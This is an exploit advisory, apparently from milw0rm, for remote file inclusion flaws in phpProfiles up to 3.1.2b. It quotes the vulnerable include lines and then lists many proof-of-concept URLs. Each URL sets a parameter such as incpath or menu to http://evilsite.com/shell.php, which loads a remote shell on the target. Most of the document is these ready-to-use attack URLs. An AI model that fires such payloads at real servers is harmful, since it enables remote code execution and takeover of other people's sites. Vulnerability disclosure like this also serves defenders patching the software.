@@ -1,0 +1,42 @@
++-------------------------------------------------------------------------------------------
++ phpProfiles <= 3.1.2b Multiple Remote File Include Vulnerabilities
++-------------------------------------------------------------------------------------------
++ Affected Software .: phpProfiles <= 3.1.2b
++ Download ..........: http://downloads.sourceforge.net/phpprofiles/phpProfiles_3_1_2.zip
++ Description .......: "phpProfiles allows you to offer visitors their very own URL on your web site simply by registering"
++ Class .............: Remote File Inclusion
++ Risk ..............: High (Remote File Execution)
++ Found By ..........: nuffsaid <nuffsaid[at]newbslove.us>
++-------------------------------------------------------------------------------------------
++ Details:
++ phpProfiles has several scripts which do not initialize variables before using them to
++ include files, assuming register_globals = on, we can initialize any one of the variables
++ in a query string and include a remote file of our choice.
++
++ Vulnerable Code:
++ include/remove_pic.inc.php line(s) 11: include("$scriptpath/redirect.php");
++ include/body_admin.inc.php line(s) 03: <p><?include("$menu");?></p>
++ include/account.inc.php,   line(s) 09: include("$incpath/footer.inc.php");
++ include/index.inc.php,     line(s) 05: include("$incpath/adminerr.inc.php");
++ ... see below for a list of files affected.
++ 
++ Proof Of Concept:
++ http://[target]/[path]/include/body.inc.php?menu=http://evilsite.com/shell.php
++ http://[target]/[path]/include/index.inc.php?incpath=http://evilsite.com/shell.php?
++ http://[target]/[path]/include/account.inc.php?action=update&incpath=http://evilsite.com/shell.php?
++ http://[target]/[path]/include/admin_newcomm.inc.php?action=create&incpath=http://evilsite.com/shell.php?
++ http://[target]/[path]/include/header_admin.inc.php?incpath=http://evilsite.com/shell.php?
++ http://[target]/[path]/include/header.inc.php?incpath=http://evilsite.com/shell.php?
++ http://[target]/[path]/include/friends.inc.php?action=invite&incpath=http://evilsite.com/shell.php?
++ http://[target]/[path]/include/menu_u.inc.php?incpath=http://evilsite.com/shell.php?
++ http://[target]/[path]/include/notify.inc.php?action=sendit&incpath=http://evilsite.com/shell.php?
++ http://[target]/[path]/include/body.inc.php?incpath=http://evilsite.com/shell.php?
++ http://[target]/[path]/include/body_admin.inc.php?menu=http://evilsite.com/shell.php
++ http://[target]/[path]/include/body_admin.inc.php?incpath=http://evilsite.com/shell.php?
++ http://[target]/[path]/include/commrecc.inc.php?action=recommend&incpath=http://evilsite.com/shell.php?
++ http://[target]/[path]/include/do_reg.inc.php?incpath=http://evilsite.com/shell.php?
++ http://[target]/[path]/include/comm_post.inc.php?action=post&incpath=http://evilsite.com/shell.php?
++ http://[target]/[path]/include/menu_v.inc.php?incpath=http://evilsite.com/shell.php?
++-------------------------------------------------------------------------------------------
+
+# milw0rm.com [2006-12-19]
